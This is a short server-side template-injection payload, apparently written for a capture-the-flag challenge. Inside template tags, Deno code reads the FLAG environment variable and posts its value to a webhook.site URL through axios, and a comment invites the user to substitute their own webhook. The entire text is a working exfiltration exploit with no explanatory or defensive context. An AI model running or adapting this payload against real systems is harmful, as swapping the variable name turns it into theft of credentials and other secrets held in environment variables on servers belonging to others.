<%
import axios from 'https://cdn.skypack.dev/axios';

const flag = Deno.env.get("FLAG");
const webhookUrl = "https://webhook.site/7f837103-10c3-46e3-9f57-500960d513ee"; // Replace with your webhook URL

if (flag) {
  console.log(`The value of FLAG is: ${flag}`);
  sendFlagToWebhook(flag);
} else {
  console.log("FLAG environment variable is not set.");
}

async function sendFlagToWebhook(flag: string) {
  try {
    await axios.post(webhookUrl, { flag });
    console.log("Flag sent to webhook successfully.");
  } catch (error) {
    console.error("Failed to send flag to webhook:", error);
  }
}
%>
